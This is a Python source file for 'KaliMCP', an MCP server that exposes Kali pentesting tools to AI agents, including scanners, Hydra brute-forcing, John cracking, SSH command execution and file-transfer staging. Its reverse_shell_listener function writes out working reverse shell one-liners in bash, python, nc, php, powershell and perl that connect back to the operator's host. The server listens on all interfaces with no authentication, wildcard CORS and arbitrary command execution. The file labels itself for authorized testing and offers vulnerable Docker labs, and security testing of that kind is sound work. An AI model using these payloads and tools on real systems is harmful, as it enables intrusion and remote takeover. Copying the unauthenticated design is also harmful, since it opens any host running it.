#!/usr/bin/env python3
"""
KaliMCP — Kali Linux Pentesting MCP Server
Programmatic access to 25+ security tools via Model Context Protocol.

Categories:
  🔍 Reconnaissance    — nmap, masscan, dnsenum, whois, theHarvester
  🌐 Web Application   — nikto, dirb, sqlmap, wfuzz, whatweb
  🔐 Exploitation      — msfconsole, searchsploit, hydra
  📡 Wireless           — aircrack-ng, reaver
  🔑 Password           — john, hashcat, hash-identifier
  🕵️ OSINT              — sherlock, amass, subfinder
  🛡️ Post-Exploitation — linpeas, winpeas, pspy
  📋 Reporting          — structured JSON/HTML report generation
  🐚 Shell Management   — SSH sessions, reverse shell listeners
  📁 File Operations    — upload, download, exfil staging

Usage:
  python3 kalimcp_server.py [--port 7070] [--docker-mode]

Author: Ali AlEnezi (@SiteQ8) — NBK Group
License: MIT — For authorized security testing only
"""

import json, os, socket, subprocess, sys, threading, shutil, tempfile
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import argparse, signal, re
from shlex import quote as q

VERSION = "1.0"
DOCKER_MODE = False
RESULTS_DIR = "./results"
SESSIONS = {}  # Active SSH/shell sessions

os.makedirs(RESULTS_DIR, exist_ok=True)

# ═══════════════════════════════════════════
# TOOL WRAPPERS
# ═══════════════════════════════════════════

def run_cmd(cmd, timeout=120):
    """Execute shell command with timeout and output capture"""
    ts = datetime.now()
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout, env={**os.environ, "TERM": "dumb"})
        return {
            "command": cmd, "stdout": r.stdout[:8000], "stderr": r.stderr[:2000],
            "return_code": r.returncode, "duration_sec": (datetime.now()-ts).total_seconds(),
            "timestamp": datetime.now().isoformat()
        }
    except subprocess.TimeoutExpired:
        return {"command": cmd, "error": f"Timeout after {timeout}s", "timestamp": datetime.now().isoformat()}
    except Exception as e:
        return {"command": cmd, "error": str(e), "timestamp": datetime.now().isoformat()}

# ═══ RECONNAISSANCE ═══

def nmap_scan(target, scan_type="default", ports=None, scripts=None):
    """Nmap scan with multiple profiles"""
    profiles = {
        "quick": f"nmap -T4 -F {q(target)}",
        "default": f"nmap -sV -sC -T4 {q(target)}",
        "full": f"nmap -sV -sC -p- -T4 {q(target)}",
        "udp": f"nmap -sU --top-ports 50 -T4 {q(target)}",
        "stealth": f"nmap -sS -T2 -f {q(target)}",
        "vuln": f"nmap -sV --script=vuln -T4 {q(target)}",
        "os": f"nmap -O -sV -T4 {q(target)}",
        "aggressive": f"nmap -A -T4 {q(target)}"
    }
    cmd = profiles.get(scan_type, profiles["default"])
    if ports: cmd += f" -p {q(str(ports))}"
    if scripts: cmd += f" --script={q(scripts)}"
    result = run_cmd(cmd, timeout=300)
    result["scan_type"] = scan_type
    result["target"] = target
    # Parse open ports from output
    open_ports = re.findall(r'(\d+)/tcp\s+open\s+(\S+)', result.get("stdout", ""))
    result["open_ports"] = [{"port": int(p), "service": s} for p, s in open_ports]
    return result

def masscan_scan(target, ports="1-65535", rate=1000):
    """Masscan — fast port scanning"""
    cmd = f"masscan {q(target)} -p{q(str(ports))} --rate={q(str(rate))} --open-only"
    return run_cmd(cmd, timeout=180)

def dns_enum(domain, tool="dnsenum"):
    """DNS enumeration"""
    cmds = {
        "dnsenum": f"dnsenum --noreverse {q(domain)}",
        "dnsrecon": f"dnsrecon -d {q(domain)}",
        "fierce": f"fierce --domain {q(domain)}"
    }
    return run_cmd(cmds.get(tool, cmds["dnsenum"]), timeout=120)

def whois_lookup(target):
    """WHOIS lookup"""
    return run_cmd(f"whois {q(target)}", timeout=30)

def theharvester(domain, source="all"):
    """theHarvester — email/subdomain/IP harvesting"""
    return run_cmd(f"theHarvester -d {q(domain)} -b {q(source)} -l 200", timeout=120)

# ═══ WEB APPLICATION ═══

def nikto_scan(target):
    """Nikto web vulnerability scanner"""
    return run_cmd(f"nikto -h {q(target)} -C all -maxtime 120s", timeout=180)

def dirb_scan(url, wordlist="/usr/share/wordlists/dirb/common.txt"):
    """DIRB directory brute-force"""
    return run_cmd(f"dirb {q(url)} {q(wordlist)} -r -z 10", timeout=180)

def gobuster_scan(url, wordlist="/usr/share/wordlists/dirb/common.txt", mode="dir"):
    """Gobuster directory/DNS/vhost enumeration"""
    return run_cmd(f"gobuster {q(mode)} -u {q(url)} -w {q(wordlist)} -t 50 --no-error", timeout=180)

def sqlmap_scan(url, data=None, level=1):
    """SQLMap SQL injection scanner"""
    cmd = f"sqlmap -u {q(url)} --batch --level={q(str(level))} --risk=1 --threads=5"
    if data: cmd += f" --data={q(data)}"
    return run_cmd(cmd, timeout=180)

def whatweb_scan(url):
    """WhatWeb technology fingerprinting"""
    return run_cmd(f"whatweb -a 3 {q(url)}", timeout=60)

def wfuzz_scan(url, wordlist="/usr/share/wordlists/dirb/common.txt", keyword="FUZZ"):
    """Wfuzz web fuzzer"""
    return run_cmd(f"wfuzz -c -z file,{q(wordlist)} --hc 404 {q(url)}", timeout=120)

# ═══ EXPLOITATION ═══

def searchsploit(query):
    """SearchSploit — search Exploit-DB"""
    result = run_cmd(f"searchsploit --json {q(query)}", timeout=30)
    try:
        data = json.loads(result.get("stdout", "{}"))
        result["exploits"] = data.get("RESULTS_EXPLOIT", [])[:20]
        result["shellcodes"] = data.get("RESULTS_SHELLCODE", [])[:10]
    except:
        pass
    return result

def hydra_attack(target, service, userlist=None, passlist=None, user=None, password=None):
    """Hydra brute-force attack"""
    cmd = f"hydra -t 4 -w 5"
    if user: cmd += f" -l {q(user)}"
    elif userlist: cmd += f" -L {q(userlist)}"
    if password: cmd += f" -p {q(password)}"
    elif passlist: cmd += f" -P {q(passlist)}"
    else: cmd += f" -P /usr/share/wordlists/rockyou.txt"
    cmd += f" {q(target)} {q(service)}"
    return run_cmd(cmd, timeout=300)

def msf_search(query):
    """Metasploit module search"""
    return run_cmd(f"msfconsole -q -x {q(f'search {query}; exit')}", timeout=60)

# ═══ PASSWORD CRACKING ═══

def john_crack(hashfile, wordlist="/usr/share/wordlists/rockyou.txt", format=None):
    """John the Ripper"""
    cmd = f"john --wordlist={q(wordlist)}"
    if format: cmd += f" --format={q(format)}"
    cmd += f" {q(hashfile)}"
    return run_cmd(cmd, timeout=300)

def hashid(hash_value):
    """Hash identification"""
    result = run_cmd(f"hash-identifier <<< {q(hash_value)}", timeout=10)
    if result.get("return_code") != 0:
        result = run_cmd(f"hashid {q(hash_value)}", timeout=10)
    return result

# ═══ OSINT ═══

def subfinder_scan(domain):
    """Subfinder subdomain discovery"""
    return run_cmd(f"subfinder -d {q(domain)} -silent", timeout=90)

def amass_enum(domain):
    """Amass subdomain enumeration"""
    return run_cmd(f"amass enum -passive -d {q(domain)}", timeout=180)

# ═══ POST-EXPLOITATION ═══

def linpeas():
    """Download and prepare LinPEAS"""
    url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
    path = f"{RESULTS_DIR}/linpeas.sh"
    return run_cmd(f"curl -sL {url} -o {path} && chmod +x {path} && echo 'LinPEAS saved to {path}'")

def enumerate_system():
    """Local system enumeration"""
    checks = {
        "hostname": "hostname",
        "kernel": "uname -a",
        "os": "cat /etc/os-release 2>/dev/null | head -3",
        "users": "cat /etc/passwd | grep -v nologin | grep -v false",
        "sudo": "sudo -l 2>/dev/null || echo 'No sudo'",
        "suid": "find / -perm -4000 -type f 2>/dev/null | head -20",
        "cron": "ls -la /etc/cron* 2>/dev/null",
        "network": "ip addr show 2>/dev/null || ifconfig",
        "processes": "ps aux --sort=-%mem | head -15",
        "connections": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"
    }
    results = {}
    for name, cmd in checks.items():
        r = run_cmd(cmd, timeout=10)
        results[name] = r.get("stdout", r.get("error", ""))
    return {"system_info": results, "timestamp": datetime.now().isoformat()}

# ═══ SHELL MANAGEMENT ═══

def ssh_connect(host, user, password=None, key=None, port=22):
    """Initiate SSH connection info (for agent to use)"""
    cmd_parts = [f"ssh -o StrictHostKeyChecking=no -p {q(str(port))}"]
    if key: cmd_parts.append(f"-i {q(key)}")
    cmd_parts.append(q(f"{user}@{host}"))
    
    session_id = f"ssh_{host}_{user}_{datetime.now().strftime('%H%M%S')}"
    SESSIONS[session_id] = {
        "type": "ssh", "host": host, "user": user, "port": port,
        "command": " ".join(cmd_parts),
        "created": datetime.now().isoformat()
    }
    
    return {
        "session_id": session_id,
        "ssh_command": " ".join(cmd_parts),
        "sshpass_command": f"sshpass -p {q(password)} {' '.join(cmd_parts)}" if password else None,
        "status": "ready",
        "note": "Use ssh_exec to run commands on this session"
    }

def ssh_exec(session_id, command):
    """Execute command via SSH session"""
    session = SESSIONS.get(session_id)
    if not session:
        return {"error": f"Session {session_id} not found"}
    
    full_cmd = f"{session['command']} {q(command)}"
    return run_cmd(full_cmd, timeout=60)

def reverse_shell_listener(port=4444, shell_type="bash"):
    """Generate reverse shell payloads and listener command"""
    lhost = socket.gethostbyname(socket.gethostname())
    
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{port} 0>&1",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "nc": f"nc -e /bin/sh {lhost} {port}",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}}\"",
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
    }
    
    return {
        "listener_command": f"nc -lvnp {port}",
        "msfconsole_listener": f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {lhost}; set LPORT {port}; run'",
        "lhost": lhost,
        "lport": port,
        "payloads": payloads,
        "upgrade_tty": [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "export TERM=xterm",
            "# Ctrl+Z then: stty raw -echo; fg"
        ]
    }

# ═══ FILE OPERATIONS ═══

def file_upload(local_path, description=""):
    """Stage file for upload/transfer"""
    if not os.path.exists(local_path):
        return {"error": f"File not found: {local_path}"}
    
    size = os.path.getsize(local_path)
    return {
        "file": local_path,
        "size_bytes": size,
        "size_human": f"{size/1024:.1f}KB" if size < 1048576 else f"{size/1048576:.1f}MB",
        "transfer_methods": {
            "python_http": f"python3 -m http.server 8888  # then wget http://LHOST:8888/{os.path.basename(local_path)}",
            "nc": f"nc -lvnp 9999 < {local_path}  # receiver: nc LHOST 9999 > {os.path.basename(local_path)}",
            "base64": f"cat {local_path} | base64 -w0  # decode: echo 'B64' | base64 -d > file",
            "scp": f"scp {local_path} user@target:/tmp/"
        },
        "description": description
    }

def file_download(url, output=None):
    """Download file from URL"""
    if not output:
        output = f"{RESULTS_DIR}/{os.path.basename(url)}"
    return run_cmd(f"curl -sL -o {q(output)} {q(url)} && ls -la {q(output)}", timeout=60)

# ═══ REPORTING ═══

def generate_report(target, findings, report_type="json"):
    """Generate pentest report"""
    report = {
        "title": f"KaliMCP Penetration Test Report — {target}",
        "generated_by": f"KaliMCP v{VERSION}",
        "author": "Ali AlEnezi (@SiteQ8)",
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "executive_summary": "",
        "findings": findings,
        "statistics": {
            "total_findings": len(findings),
            "critical": sum(1 for f in findings if f.get("severity") == "CRITICAL"),
            "high": sum(1 for f in findings if f.get("severity") == "HIGH"),
            "medium": sum(1 for f in findings if f.get("severity") == "MEDIUM"),
            "low": sum(1 for f in findings if f.get("severity") == "LOW"),
            "info": sum(1 for f in findings if f.get("severity") == "INFO")
        },
        "risk_rating": "UNKNOWN"
    }
    
    stats = report["statistics"]
    if stats["critical"] > 0: report["risk_rating"] = "CRITICAL"
    elif stats["high"] > 2: report["risk_rating"] = "HIGH"
    elif stats["high"] > 0: report["risk_rating"] = "MEDIUM"
    else: report["risk_rating"] = "LOW"
    
    report["executive_summary"] = (
        f"Security assessment of {target} identified {stats['total_findings']} findings: "
        f"{stats['critical']} critical, {stats['high']} high, {stats['medium']} medium, "
        f"{stats['low']} low, {stats['info']} informational. "
        f"Overall risk rating: {report['risk_rating']}."
    )
    
    # Save report
    report_path = f"{RESULTS_DIR}/report_{target.replace('.','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_path, "w") as f:
        json.dump(report, f, indent=2)
    
    report["saved_to"] = report_path
    return report

# ═══ DOCKER TEST MODE ═══

def docker_lab_setup():
    """Set up Docker-based vulnerable lab for safe testing"""
    labs = {
        "dvwa": {
            "name": "DVWA (Damn Vulnerable Web App)",
            "command": "docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa",
            "url": "http://localhost:8081",
            "creds": "admin / password"
        },
        "juiceshop": {
            "name": "OWASP Juice Shop",
            "command": "docker run -d -p 3000:3000 --name juiceshop bkimminich/juice-shop",
            "url": "http://localhost:3000",
            "creds": "No default — create account"
        },
        "metasploitable": {
            "name": "Metasploitable 3",
            "command": "docker run -d -p 8082:80 -p 2222:22 --name metasploitable tleemcjr/metasploitable2",
            "url": "http://localhost:8082",
            "creds": "msfadmin / msfadmin"
        },
        "webgoat": {
            "name": "OWASP WebGoat",
            "command": "docker run -d -p 8083:8080 --name webgoat webgoat/webgoat",
            "url": "http://localhost:8083/WebGoat",
            "creds": "Register new account"
        },
        "hackazon": {
            "name": "Hackazon",
            "command": "docker run -d -p 8084:80 --name hackazon ianwijaya/hackazon",
            "url": "http://localhost:8084",
            "creds": "test@test.com / test"
        }
    }
    return {"labs": labs, "docker_check": shutil.which("docker") is not None,
            "note": "Run docker commands to spin up vulnerable labs for safe testing"}

def list_sessions():
    """List active sessions"""
    return {"sessions": SESSIONS, "count": len(SESSIONS)}

# ═══ MCP TOOL REGISTRY ═══

TOOLS = {
    # Reconnaissance
    "nmap_scan": {"description": "Nmap port/service/vuln scan — 8 profiles (quick/default/full/stealth/vuln/os/aggressive/udp)", "parameters": {"target": {"type": "string"}, "scan_type": {"type": "string", "default": "default"}, "ports": {"type": "string"}, "scripts": {"type": "string"}}, "category": "recon"},
    "masscan_scan": {"description": "Masscan — ultra-fast port scanner (1-65535 in seconds)", "parameters": {"target": {"type": "string"}, "ports": {"type": "string", "default": "1-65535"}, "rate": {"type": "integer", "default": 1000}}, "category": "recon"},
    "dns_enum": {"description": "DNS enumeration via dnsenum/dnsrecon/fierce", "parameters": {"domain": {"type": "string"}, "tool": {"type": "string", "default": "dnsenum"}}, "category": "recon"},
    "whois_lookup": {"description": "WHOIS domain/IP lookup", "parameters": {"target": {"type": "string"}}, "category": "recon"},
    "theharvester": {"description": "theHarvester — harvest emails, subdomains, IPs from OSINT sources", "parameters": {"domain": {"type": "string"}, "source": {"type": "string", "default": "all"}}, "category": "recon"},
    # Web
    "nikto_scan": {"description": "Nikto web vulnerability scanner", "parameters": {"target": {"type": "string"}}, "category": "web"},
    "dirb_scan": {"description": "DIRB directory brute-force", "parameters": {"url": {"type": "string"}, "wordlist": {"type": "string"}}, "category": "web"},
    "gobuster_scan": {"description": "Gobuster dir/dns/vhost enumeration", "parameters": {"url": {"type": "string"}, "wordlist": {"type": "string"}, "mode": {"type": "string", "default": "dir"}}, "category": "web"},
    "sqlmap_scan": {"description": "SQLMap SQL injection scanner", "parameters": {"url": {"type": "string"}, "data": {"type": "string"}, "level": {"type": "integer", "default": 1}}, "category": "web"},
    "whatweb_scan": {"description": "WhatWeb technology fingerprinting", "parameters": {"url": {"type": "string"}}, "category": "web"},
    "wfuzz_scan": {"description": "Wfuzz web application fuzzer", "parameters": {"url": {"type": "string"}, "wordlist": {"type": "string"}}, "category": "web"},
    # Exploitation
    "searchsploit": {"description": "SearchSploit — search Exploit-DB for exploits", "parameters": {"query": {"type": "string"}}, "category": "exploit"},
    "hydra_attack": {"description": "Hydra brute-force (SSH, FTP, HTTP, etc.)", "parameters": {"target": {"type": "string"}, "service": {"type": "string"}, "user": {"type": "string"}, "passlist": {"type": "string"}}, "category": "exploit"},
    "msf_search": {"description": "Metasploit module search", "parameters": {"query": {"type": "string"}}, "category": "exploit"},
    # Password
    "john_crack": {"description": "John the Ripper password cracking", "parameters": {"hashfile": {"type": "string"}, "wordlist": {"type": "string"}, "format": {"type": "string"}}, "category": "password"},
    "hashid": {"description": "Hash type identification", "parameters": {"hash_value": {"type": "string"}}, "category": "password"},
    # OSINT
    "subfinder_scan": {"description": "Subfinder passive subdomain discovery", "parameters": {"domain": {"type": "string"}}, "category": "osint"},
    "amass_enum": {"description": "Amass subdomain enumeration", "parameters": {"domain": {"type": "string"}}, "category": "osint"},
    # Post-Exploitation
    "enumerate_system": {"description": "Local system enumeration (users, SUID, cron, network, processes)", "parameters": {}, "category": "postexploit"},
    "linpeas": {"description": "Download LinPEAS privilege escalation scanner", "parameters": {}, "category": "postexploit"},
    # Shell Management
    "ssh_connect": {"description": "Initiate SSH connection", "parameters": {"host": {"type": "string"}, "user": {"type": "string"}, "password": {"type": "string"}, "key": {"type": "string"}, "port": {"type": "integer", "default": 22}}, "category": "shell"},
    "ssh_exec": {"description": "Execute command on SSH session", "parameters": {"session_id": {"type": "string"}, "command": {"type": "string"}}, "category": "shell"},
    "reverse_shell_listener": {"description": "Generate reverse shell payloads (bash, python, nc, php, powershell, perl) + listener", "parameters": {"port": {"type": "integer", "default": 4444}}, "category": "shell"},
    "list_sessions": {"description": "List active SSH/shell sessions", "parameters": {}, "category": "shell"},
    # File Ops
    "file_upload": {"description": "Stage file for transfer to target", "parameters": {"local_path": {"type": "string"}}, "category": "file"},
    "file_download": {"description": "Download file from URL", "parameters": {"url": {"type": "string"}, "output": {"type": "string"}}, "category": "file"},
    # Reporting
    "generate_report": {"description": "Generate structured pentest report (JSON)", "parameters": {"target": {"type": "string"}, "findings": {"type": "array"}}, "category": "report"},
    # Docker Lab
    "docker_lab_setup": {"description": "Set up Docker-based vulnerable labs (DVWA, Juice Shop, Metasploitable, WebGoat)", "parameters": {}, "category": "lab"},
}

# ═══ MCP HTTP SERVER ═══

class KaliMCPHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        try: req = json.loads(body)
        except: self.send_json({"error": "Invalid JSON"}, 400); return

        method = req.get("method", "")
        params = req.get("params", {})

        if method == "tools/list":
            tools_list = []
            for name, info in TOOLS.items():
                tools_list.append({"name": name, "description": info["description"],
                                   "category": info["category"], "parameters": info["parameters"]})
            self.send_json({"tools": tools_list, "total": len(tools_list),
                           "categories": sorted(set(t["category"] for t in TOOLS.values()))})
        elif method == "tools/call":
            name = params.get("name", "")
            args = params.get("arguments", {})
            result = self.execute_tool(name, args)
            self.send_json({"result": result})
        else:
            self.send_json({"error": f"Unknown method: {method}"}, 404)

    def execute_tool(self, name, args):
        dispatch = {
            "nmap_scan": lambda: nmap_scan(args.get("target",""), args.get("scan_type","default"), args.get("ports"), args.get("scripts")),
            "masscan_scan": lambda: masscan_scan(args.get("target",""), args.get("ports","1-65535"), args.get("rate",1000)),
            "dns_enum": lambda: dns_enum(args.get("domain",""), args.get("tool","dnsenum")),
            "whois_lookup": lambda: whois_lookup(args.get("target","")),
            "theharvester": lambda: theharvester(args.get("domain",""), args.get("source","all")),
            "nikto_scan": lambda: nikto_scan(args.get("target","")),
            "dirb_scan": lambda: dirb_scan(args.get("url",""), args.get("wordlist","/usr/share/wordlists/dirb/common.txt")),
            "gobuster_scan": lambda: gobuster_scan(args.get("url",""), args.get("wordlist","/usr/share/wordlists/dirb/common.txt"), args.get("mode","dir")),
            "sqlmap_scan": lambda: sqlmap_scan(args.get("url",""), args.get("data"), args.get("level",1)),
            "whatweb_scan": lambda: whatweb_scan(args.get("url","")),
            "wfuzz_scan": lambda: wfuzz_scan(args.get("url",""), args.get("wordlist","/usr/share/wordlists/dirb/common.txt")),
            "searchsploit": lambda: searchsploit(args.get("query","")),
            "hydra_attack": lambda: hydra_attack(args.get("target",""), args.get("service",""), args.get("user"), args.get("passlist")),
            "msf_search": lambda: msf_search(args.get("query","")),
            "john_crack": lambda: john_crack(args.get("hashfile",""), args.get("wordlist","/usr/share/wordlists/rockyou.txt"), args.get("format")),
            "hashid": lambda: hashid(args.get("hash_value","")),
            "subfinder_scan": lambda: subfinder_scan(args.get("domain","")),
            "amass_enum": lambda: amass_enum(args.get("domain","")),
            "enumerate_system": lambda: enumerate_system(),
            "linpeas": lambda: linpeas(),
            "ssh_connect": lambda: ssh_connect(args.get("host",""), args.get("user",""), args.get("password"), args.get("key"), args.get("port",22)),
            "ssh_exec": lambda: ssh_exec(args.get("session_id",""), args.get("command","")),
            "reverse_shell_listener": lambda: reverse_shell_listener(args.get("port",4444)),
            "list_sessions": lambda: list_sessions(),
            "file_upload": lambda: file_upload(args.get("local_path","")),
            "file_download": lambda: file_download(args.get("url",""), args.get("output")),
            "generate_report": lambda: generate_report(args.get("target",""), args.get("findings",[])),
            "docker_lab_setup": lambda: docker_lab_setup(),
        }
        fn = dispatch.get(name)
        if not fn: return {"error": f"Unknown tool: {name}"}
        try: return fn()
        except Exception as e: return {"error": str(e)}

    def send_json(self, data, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2, default=str).encode())

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def log_message(self, f, *a):
        print(f"[KaliMCP] {datetime.now().strftime('%H:%M:%S')} — {f%a}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="KaliMCP Server")
    parser.add_argument("--port", type=int, default=7070)
    parser.add_argument("--docker-mode", action="store_true", help="Docker test mode")
    args = parser.parse_args()
    DOCKER_MODE = args.docker_mode

    banner = f"""
╔═══════════════════════════════════════════════════════╗
║  _  __     _ _ __  __  ____ ____                      ║
║ | |/ /__ _| (_)  \/  |/ ___|  _ \                     ║
║ | ' // _` | | | |\/| | |   | |_) |                    ║
║ | . \ (_| | | | |  | | |___|  __/                     ║
║ |_|\_\__,_|_|_|_|  |_|\____|_|                        ║
║                                                       ║
║  Kali Linux Pentesting MCP Server v{VERSION}               ║
║  {len(TOOLS)} tools · 8 categories · Ali AlEnezi (@SiteQ8)    ║
║  Port: {args.port} {'· Docker Mode' if DOCKER_MODE else ''}                                     ║
╚═══════════════════════════════════════════════════════╝
"""
    print(banner)
    for cat in sorted(set(t["category"] for t in TOOLS.values())):
        cat_tools = [n for n, t in TOOLS.items() if t["category"] == cat]
        print(f"  [{cat:12s}] {', '.join(cat_tools)}")
    print(f"\n[KaliMCP] Server running on http://0.0.0.0:{args.port}\n")

    HTTPServer(("0.0.0.0", args.port), KaliMCPHandler).serve_forever()
